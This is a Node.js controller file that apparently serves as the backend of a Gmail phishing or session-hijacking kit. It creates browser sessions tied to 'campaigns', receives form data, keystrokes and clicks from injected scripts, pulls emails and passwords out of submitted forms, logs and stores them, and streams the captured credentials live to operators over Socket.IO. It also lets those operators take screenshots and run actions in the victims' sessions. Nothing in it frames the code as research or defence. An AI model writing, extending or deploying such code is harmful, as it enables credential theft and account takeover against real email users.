const GmailBrowserService = require('../services/gmailBrowserService');

class GmailBrowserController {
  constructor() {
    this.gmailBrowserService = new GmailBrowserService();
    this.gmailBrowserService.startCleanupInterval();
  }

  /**
   * Set Socket.IO instance
   */
  setSocketIO(io) {
    this.gmailBrowserService.setSocketIO(io);
    this.setupSocketHandlers(io);
  }

  /**
   * Create a new Gmail browser session
   */
  async createSession(req, res) {
    try {
      const { sessionToken, campaignId } = req.body;
      
      if (!sessionToken || !campaignId) {
        return res.status(400).json({
          success: false,
          message: 'Session token and campaign ID are required'
        });
      }

      const userInfo = {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        timestamp: new Date(),
      };

      const sessionInfo = await this.gmailBrowserService.createGmailSession(
        sessionToken,
        campaignId,
        userInfo
      );

      res.json({
        success: true,
        session: sessionInfo,
        message: 'Gmail browser session created successfully'
      });

    } catch (error) {
      console.error('Error creating Gmail session:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to create Gmail browser session',
        error: error.message
      });
    }
  }

  /**
   * Get session information
   */
  async getSession(req, res) {
    try {
      const { sessionToken } = req.params;
      const sessionInfo = this.gmailBrowserService.getSessionInfo(sessionToken);

      if (!sessionInfo) {
        return res.status(404).json({
          success: false,
          message: 'Session not found'
        });
      }

      res.json({
        success: true,
        session: sessionInfo
      });

    } catch (error) {
      console.error('Error getting session info:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to get session information',
        error: error.message
      });
    }
  }

  /**
   * Get all active sessions
   */
  async getAllSessions(req, res) {
    try {
      const sessions = this.gmailBrowserService.getAllSessions();
      
      res.json({
        success: true,
        sessions,
        count: sessions.length
      });

    } catch (error) {
      console.error('Error getting all sessions:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to get sessions',
        error: error.message
      });
    }
  }

  /**
   * Execute action on browser session
   */
  async executeAction(req, res) {
    try {
      const { sessionToken } = req.params;
      const { action, params = {} } = req.body;

      if (!action) {
        return res.status(400).json({
          success: false,
          message: 'Action is required'
        });
      }

      const result = await this.gmailBrowserService.executeAction(
        sessionToken,
        action,
        params
      );

      res.json({
        success: result.success,
        result,
        message: result.message || 'Action executed'
      });

    } catch (error) {
      console.error('Error executing action:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to execute action',
        error: error.message
      });
    }
  }

  /**
   * Get screenshot of current page
   */
  async getScreenshot(req, res) {
    try {
      const { sessionToken } = req.params;
      const screenshot = await this.gmailBrowserService.getScreenshot(sessionToken);

      res.setHeader('Content-Type', 'image/png');
      res.send(screenshot);

    } catch (error) {
      console.error('Error getting screenshot:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to get screenshot',
        error: error.message
      });
    }
  }

  /**
   * Close browser session
   */
  async closeSession(req, res) {
    try {
      const { sessionToken } = req.params;
      const result = await this.gmailBrowserService.closeSession(sessionToken);

      if (result) {
        res.json({
          success: true,
          message: 'Session closed successfully'
        });
      } else {
        res.status(404).json({
          success: false,
          message: 'Session not found or already closed'
        });
      }

    } catch (error) {
      console.error('Error closing session:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to close session',
        error: error.message
      });
    }
  }

  /**
   * Handle form data capture from injected scripts
   */
  async captureForm(req, res) {
    try {
      const { sessionToken } = req.params;
      const { formData, url } = req.body;

      console.log(`📝 Form data captured for session ${sessionToken}:`, formData);

      // Check if this contains credentials
      const credentials = this.extractCredentialsFromFormData(formData);
      
      if (credentials.email || credentials.password) {
        console.log(`🔑 CREDENTIALS DETECTED:`, credentials);
        
        // Broadcast to viewers
        const sessionData = this.gmailBrowserService.activeSessions.get(sessionToken);
        if (sessionData) {
          sessionData.capturedCredentials.push({
            ...credentials,
            timestamp: new Date(),
            url,
            source: 'form_capture',
          });

          // Notify viewers via Socket.IO
          if (this.gmailBrowserService.io) {
            this.gmailBrowserService.io.to(`gmail-session-${sessionToken}`).emit('credentialsCaptured', {
              credentials,
              timestamp: new Date(),
              url,
              source: 'form_capture',
            });
          }
        }
      }

      res.json({ success: true });

    } catch (error) {
      console.error('Error capturing form data:', error);
      res.status(500).json({ success: false, error: error.message });
    }
  }

  /**
   * Handle input capture from injected scripts
   */
  async captureInput(req, res) {
    try {
      const { sessionToken } = req.params;
      const { type, name, value, url } = req.body;

      console.log(`📝 Input captured for session ${sessionToken}:`, { type, name, value: '***' });

      // Broadcast to viewers for real-time monitoring
      if (this.gmailBrowserService.io) {
        this.gmailBrowserService.io.to(`gmail-session-${sessionToken}`).emit('inputCaptured', {
          type,
          name,
          url,
          timestamp: new Date(),
        });
      }

      res.json({ success: true });

    } catch (error) {
      console.error('Error capturing input:', error);
      res.status(500).json({ success: false, error: error.message });
    }
  }

  /**
   * Handle click tracking from injected scripts
   */
  async trackClick(req, res) {
    try {
      const { sessionToken } = req.params;
      const { element, url } = req.body;

      console.log(`👆 Click tracked for session ${sessionToken}:`, element);

      // Broadcast to viewers
      if (this.gmailBrowserService.io) {
        this.gmailBrowserService.io.to(`gmail-session-${sessionToken}`).emit('clickTracked', {
          element,
          url,
          timestamp: new Date(),
        });
      }

      res.json({ success: true });

    } catch (error) {
      console.error('Error tracking click:', error);
      res.status(500).json({ success: false, error: error.message });
    }
  }

  /**
   * Extract credentials from form data
   */
  extractCredentialsFromFormData(formData) {
    const credentials = {};
    
    for (const [key, value] of Object.entries(formData)) {
      const keyLower = key.toLowerCase();
      
      // Check for email/username
      if ((keyLower.includes('email') || 
           keyLower.includes('user') || 
           keyLower.includes('identifier') ||
           keyLower === 'email' ||
           keyLower === 'username') && 
          value && (value.includes('@') || value.length > 3)) {
        credentials.email = value;
      }
      
      // Check for password
      if ((keyLower.includes('pass') || 
           keyLower.includes('pwd') || 
           keyLower === 'password') && 
          value && value.length > 0) {
        credentials.password = value;
      }
    }
    
    return credentials;
  }

  /**
   * Setup Socket.IO handlers for real-time browser control
   */
  setupSocketHandlers(io) {
    io.on('connection', (socket) => {
      console.log(`🔌 New client connected: ${socket.id}`);

      // Join a specific Gmail session room
      socket.on('joinGmailSession', (data) => {
        const { sessionToken, userId } = data;
        
        if (sessionToken) {
          socket.join(`gmail-session-${sessionToken}`);
          this.gmailBrowserService.addViewer(sessionToken, socket.id);
          
          console.log(`👁️ User ${userId || socket.id} joined Gmail session: ${sessionToken}`);
          
          // Send current session info
          const sessionInfo = this.gmailBrowserService.getSessionInfo(sessionToken);
          if (sessionInfo) {
            socket.emit('sessionInfo', sessionInfo);
          }
        }
      });

      // Leave Gmail session room
      socket.on('leaveGmailSession', (data) => {
        const { sessionToken } = data;
        
        if (sessionToken) {
          socket.leave(`gmail-session-${sessionToken}`);
          this.gmailBrowserService.removeViewer(sessionToken, socket.id);
          
          console.log(`👁️ User ${socket.id} left Gmail session: ${sessionToken}`);
        }
      });

      // Execute browser action via Socket.IO
      socket.on('executeBrowserAction', async (data) => {
        const { sessionToken, action, params } = data;
        
        try {
          const result = await this.gmailBrowserService.executeAction(
            sessionToken,
            action,
            params
          );
          
          socket.emit('actionResult', {
            action,
            params,
            result,
            requestId: data.requestId,
          });
          
        } catch (error) {
          socket.emit('actionError', {
            action,
            error: error.message,
            requestId: data.requestId,
          });
        }
      });

      // Request screenshot
      socket.on('requestScreenshot', async (data) => {
        const { sessionToken } = data;
        
        try {
          const screenshot = await this.gmailBrowserService.getScreenshot(sessionToken);
          
          socket.emit('screenshot', {
            sessionToken,
            screenshot: screenshot.toString('base64'),
            timestamp: new Date(),
          });
          
        } catch (error) {
          socket.emit('screenshotError', {
            sessionToken,
            error: error.message,
          });
        }
      });

      // Handle disconnect
      socket.on('disconnect', () => {
        console.log(`🔌 Client disconnected: ${socket.id}`);
        
        // Remove from all sessions
        for (const sessionToken of this.gmailBrowserService.activeSessions.keys()) {
          this.gmailBrowserService.removeViewer(sessionToken, socket.id);
        }
      });
    });
  }
}

module.exports = GmailBrowserController;
